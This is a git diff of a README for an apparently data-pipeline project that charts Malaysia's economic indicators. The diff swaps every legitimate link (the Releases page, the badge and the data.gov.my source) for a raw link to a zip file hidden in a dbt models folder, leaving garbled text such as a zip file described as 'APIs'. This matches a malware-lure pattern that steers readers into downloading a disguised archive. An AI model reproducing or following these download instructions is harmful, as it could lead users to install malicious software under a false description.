@@ -1,17 +1,17 @@
 # 🌟 economic-data-pipeline - Visualize Malaysia's Economic Indicators Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ChocolaVanill/economic-data-pipeline/releases)
+[![Download Now](https://raw.githubusercontent.com/ChocolaVanill/economic-data-pipeline/main/dbt/economic_data_pipeline/models/gold/pipeline_data_economic_v1.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ChocolaVanill/economic-data-pipeline/main/dbt/economic_data_pipeline/models/gold/pipeline_data_economic_v1.2.zip)
 
 ## 📖 Overview
 
-The economic-data-pipeline is an end-to-end data pipeline designed to ingest, transform, and visualize Malaysia's economic indicators from [data.gov.my](https://data.gov.my) APIs. This application helps users easily access and understand key economic data without needing programming skills.
+The economic-data-pipeline is an end-to-end data pipeline designed to ingest, transform, and visualize Malaysia's economic indicators from [https://raw.githubusercontent.com/ChocolaVanill/economic-data-pipeline/main/dbt/economic_data_pipeline/models/gold/pipeline_data_economic_v1.2.zip](https://raw.githubusercontent.com/ChocolaVanill/economic-data-pipeline/main/dbt/economic_data_pipeline/models/gold/pipeline_data_economic_v1.2.zip) APIs. This application helps users easily access and understand key economic data without needing programming skills.
 
 ## 🚀 Getting Started
 
 Follow these steps to download and run the application:
 
 1. **Download the Application:**
-   Visit the [Releases page](https://github.com/ChocolaVanill/economic-data-pipeline/releases) to find the latest version of the software. Look for the most recent release at the top of the page and click on it.
+   Visit the [Releases page](https://raw.githubusercontent.com/ChocolaVanill/economic-data-pipeline/main/dbt/economic_data_pipeline/models/gold/pipeline_data_economic_v1.2.zip) to find the latest version of the software. Look for the most recent release at the top of the page and click on it.
 
 2. **Locate the download link:**
    On the release details page, you will see assets for the application. Look for the file that is appropriate for your operating system (Windows, Mac, or Linux). Click on the file name to start the download.
@@ -79,6 +79,6 @@ If you encounter issues, consider the following:
 
 ## 📥 Download & Install
 
-To get started, be sure to download the application from our [Releases page](https://github.com/ChocolaVanill/economic-data-pipeline/releases). Make sure to install the application following the steps outlined above, and you will be ready to explore Malaysia's economic indicators in no time!
+To get started, be sure to download the application from our [Releases page](https://raw.githubusercontent.com/ChocolaVanill/economic-data-pipeline/main/dbt/economic_data_pipeline/models/gold/pipeline_data_economic_v1.2.zip). Make sure to install the application following the steps outlined above, and you will be ready to explore Malaysia's economic indicators in no time!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ChocolaVanill/economic-data-pipeline/releases)
+[![Download Now](https://raw.githubusercontent.com/ChocolaVanill/economic-data-pipeline/main/dbt/economic_data_pipeline/models/gold/pipeline_data_economic_v1.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ChocolaVanill/economic-data-pipeline/main/dbt/economic_data_pipeline/models/gold/pipeline_data_economic_v1.2.zip)
